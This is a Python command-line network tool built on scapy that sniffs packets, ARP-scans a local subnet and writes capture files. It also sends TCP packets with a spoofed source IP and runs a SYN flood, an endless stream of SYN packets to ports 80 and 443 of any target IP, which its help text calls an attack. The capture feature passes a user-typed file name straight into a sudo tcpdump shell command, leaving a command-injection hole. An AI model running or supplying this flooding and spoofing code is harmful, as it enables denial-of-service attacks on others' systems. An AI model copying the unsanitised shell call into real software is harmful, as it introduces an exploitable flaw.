from os import system
from scapy.all import *
import threading

class NetworkManager:
    def __init__(self):
        self.captured_packets = {}
        self.packet_counter = 0
        self.sniff_thread = None
        self.stop_sniffing_flag = threading.Event()

    def start_sniffing(self):
        sniff(prn=self.add_packet, stop_filter=self.stop_sniffing)

    def sniff_continuous(self):
        while not self.stop_sniffing_flag.is_set():
            self.start_sniffing()

    def start(self):
        if self.sniff_thread and self.sniff_thread.is_alive():
            print("Sniffing is already started.")
            return

        print("Starting packet sniffing...")
        self.stop_sniffing_flag.clear()
        self.sniff_thread = threading.Thread(target=self.sniff_continuous)
        self.sniff_thread.start()

    def stop_sniffing(self, packet):
        return self.stop_sniffing_flag.is_set()

    def stop(self):
        if not self.sniff_thread or not self.sniff_thread.is_alive():
            print("Sniffing is not started.")
            return

        print("Stopping packet sniffing...")
        self.stop_sniffing_flag.set()
        self.sniff_thread.join()

    def add_packet(self, packet):
        self.packet_counter += 1
        self.captured_packets[self.packet_counter] = packet

    def print_packet(self):
        print("{ CAPTURED PACKETS } -----------------------------------------------")
        for counter, packet in self.captured_packets.items():
            if isinstance(packet, str):
                print(packet)
            else:
                print(f"{counter}: {packet.summary()}")
        print("{ END } ------------------------------------------------------------")

    def pcap_gen(self):
        self.filename = input("What name do you want for your file name: ")
        system('sudo tcpdump -i wlan0 -w ' + str(self.filename))
        system('^C')
        
    def scan_network(self):
        print("{ ACTIVE HOSTS } -----------------------------------------------------")
        ip_mac = {}
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2, verbose=1)
        for _, rcv in ans:
            ip_mac[rcv.psrc] = rcv.sprintf("%Ether.src%")
        print("{ END } ------------------------------------------------------------")
        return ip_mac

    def send_packet(self, packet, source_ip):
        packet = packet.copy()
        packet[IP].src = source_ip
        sendp(packet)

    def syn_flood(self, target_ip):
        target_ports = [80, 443]
        for port in target_ports:
            packet = IP(dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=port)
            send(packet, verbose=0, loop=1)

class CLI:
    def __init__(self, network_manager):
        self.network_manager = network_manager

    def print_help(self):
        print("\033[34mAvailable commands:")
        print("  \033[32mhelp:\033[0m Return a list of available commands")
        print("  \033[32mstart:\033[0m Start packet sniffing")
        print("  \033[32mstop:\033[0m Stop packet sniffing")
        print("  \033[32mpacket:\033[0m Print captured packets")
        print("  \033[32mscan:\033[0m Scan for active hosts in the network")
        print("  \033[32msend <source_ip> <destination_ip>:\033[0m Send a packet (optional source IP)")
        print("  \033[32msyn_flood <target_ip>:\033[0m Perform a SYN flood attack on a target IP address")
        print("  \033[32mpcap_gen:\033[0m Generate a Pcap file")

    def run(self):
        print(f"\033[34mType 'help' for available commands.\033[0m")
        while True:
            command = input("\033[34mEnter a command: \033[0m").strip().split(' ', 1)
            action = command[0]
            args = command[1:] if len(command) > 1 else []
            if action == "help":
                self.print_help()
            elif action == "start":
                self.network_manager.start()
            elif action == "stop":
                self.network_manager.stop()
            elif action == "pcap_gen":
                self.network_manager.pcap_gen()
            elif action == "packet":
                self.network_manager.print_packet()
            elif action == "scan":
                self.network_manager.scan_network()
            elif action == "send":
                if len(args) != 1:
                    print("Please provide both source and destination IP addresses.")
                else:
                    src_ip, dst_ip = args[0].split()
                    packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=80)
                    self.network_manager.send_packet(packet, src_ip)
            elif action == "syn_flood":
                if len(args) != 1:
                    print("Please provide the target IP address.")
                else:
                    target_ip = args[0]
                    self.network_manager.syn_flood(target_ip)
            else:
                print("Invalid command. Type 'help' for available commands.")

if __name__ == "__main__":
    network_manager = NetworkManager()
    cli = CLI(network_manager)
    cli.run()
